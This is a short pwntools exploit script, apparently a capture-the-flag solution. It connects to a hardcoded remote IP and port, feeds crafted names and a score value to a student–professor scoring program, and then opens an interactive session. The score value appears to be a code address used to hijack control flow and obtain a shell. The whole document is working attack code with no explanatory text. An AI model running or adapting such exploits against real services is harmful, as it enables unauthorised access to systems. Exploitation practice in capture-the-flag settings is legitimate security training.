#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51001)
r.sendline(b"vuln")
print(r.recvuntil(b"Input the name of the favorite professor of a student"))
r.sendline(b"vuln")
print(r.recvuntil(b"Input the name of the student that will give the score"))
r.sendline(b"vuln")
print(r.recvuntil(b"Input the name of the professor that will be scored"))
r.sendline(b"vuln")
print(r.recvuntil(b"Input the score:"))
r.sendline(b"134517494")


print(r.recvuntil(b"Input the name of a student"))
r.sendline(b"jack")
print(r.recvuntil(b"Input the name of the favorite professor of a student"))
r.sendline(b"jiuhao")
print(r.recvuntil(b"Input the name of the student that will give the score"))
r.sendline(b"vuln")
print(r.recvuntil(b"Input the name of the professor that will be scored"))
r.sendline(b"jiuhao")
print(r.recvuntil(b"Input the score:"))
r.sendline(b"0")
r.interactive()
